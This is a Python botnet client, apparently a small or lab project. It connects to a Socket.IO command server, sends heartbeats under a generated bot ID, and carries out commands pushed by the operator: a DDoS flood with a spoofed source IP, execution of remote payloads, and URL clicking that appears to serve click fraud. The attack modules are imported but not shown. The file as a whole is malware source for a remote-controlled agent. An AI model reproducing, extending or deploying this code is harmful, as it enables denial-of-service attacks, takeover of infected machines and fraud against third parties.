from commands.click import CommandClick
from commands.rce import CommandRCE
from commands.ddos import CommandDDoS
from commands.command import Command, CommandType
import socketio
import uuid

from utils import Interval

socket_client = socketio.Client()
running_command: Command = None
botnet_id = str(uuid.uuid4())

def start_client() -> None:
    socket_client.connect("ws://localhost:5000")

# SocketIO event definitions
def send_heartbeat():
    """
    Send heartbeat to server
    """
    socket_client.emit('heartbeat', { "uuid": botnet_id, "running": True if running_command is not None else False })
    print("Sending heartbeat")


def stop_heartbeat():
    """
    Stop heartbeat sending
    """
    global heartbeat
    heartbeat.stop()
    heartbeat = Interval(1000, send_heartbeat)

heartbeat = Interval(1000, send_heartbeat)


@socket_client.event
def connect():
    global heartbeat
    print('Connected to SocketIO server')
    heartbeat.start()

@socket_client.event
def connect_error(data):
    print("Failed to connect to SocketIO server")
    print(data)

@socket_client.event
def disconnect():
    global heartbeat
    print("Disconnected from SocketIO server")
    stop_heartbeat()

@socket_client.on('command')
def on_command(data):
    global running_command

    command: Command = None
    if data['type'] == CommandType.DDoS:
        command = CommandDDoS(data['target_ip'], data['target_port'], data['fake_ip'], data['nb_threads'])
    elif data['type'] == CommandType.RCE:
        command = CommandRCE(data['payload'])
    elif data['type'] == CommandType.CLICK:
        command = CommandClick(data['url'])

    if command is not None:
        running_command = command
        running_command.process()
        if running_command.is_atomic:
            # Reset attack status after execution
            running_command = None
    else:
        print('Error, command {} does not exists'.format(data['type']))

@socket_client.on('stop')
def on_stop():
    global running_command

    if running_command is not None:
        running_command.stop()
        running_command = None